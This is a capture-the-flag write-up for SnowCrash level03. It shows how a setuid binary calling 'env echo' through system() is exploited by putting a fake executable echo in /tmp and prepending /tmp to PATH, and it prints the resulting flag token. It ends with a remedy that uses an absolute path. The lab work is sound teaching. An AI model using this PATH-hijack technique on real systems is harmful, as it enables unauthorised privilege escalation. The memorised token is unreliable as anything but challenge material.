Level 03
========

*	We spawn with a `level03` file in root repository
*	No extension so I try to execute it and it prints 'Exploit me'
*	Then I try to _cat_ the file but its unreadable since its an executable
*	Using `file` command I saw that I should be able to get the asm code:
	```console
	level03@SnowCrash:~$ file level03 
	level03: setuid setgid ELF 32-bit LSB executable...
	```
*	I wanted to get a good look at the file so I used scp to get it on my machine and then:
	```console
	root@DESKTOP-69N2SL4:~# objdump -M Intel -d level03 > dump.s
	```
*	Code was still kinda bad so I did a little script to make it cleaner:
	```console
	root@DESKTOP-69N2SL4:~# sh cutlines.sh
	```
*   We can see many calls but one of them is a system one :
	```assembly
	...
	call   80483b0 <system@plt>
	...
	```
*   So when we look into it on `gdb`
	```
	(gdb) x/s 0x80485e0
	0x80485e0:       "/usr/bin/env echo Exploit me"
	```
*   It seems like `echo` is vulnerable to manipulation since it's called using `/usr/bin/env` which makes the computer use the first binary found in `PATH`
*   So we should be able to create a script called echo to get the flag for us !
	```console
	level03@SnowCrash:~$ echo 'getflag' > /tmp/echo
	level03@SnowCrash:~$ export PATH=/tmp:$PATH
	level03@SnowCrash:~$ ./level03
	Exploit me
	```
*   DOESN'T WORK ! WHY ? (Well I forgot a little something)
	```console
	level03@SnowCrash:~$ chmod +x /tmp/echo
	level03@SnowCrash:~$ ./level03
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
	```
REMEDY
======

Most obvious thing we could do to fix this one would be to call echo with the absolute path `/usr/bin/echo`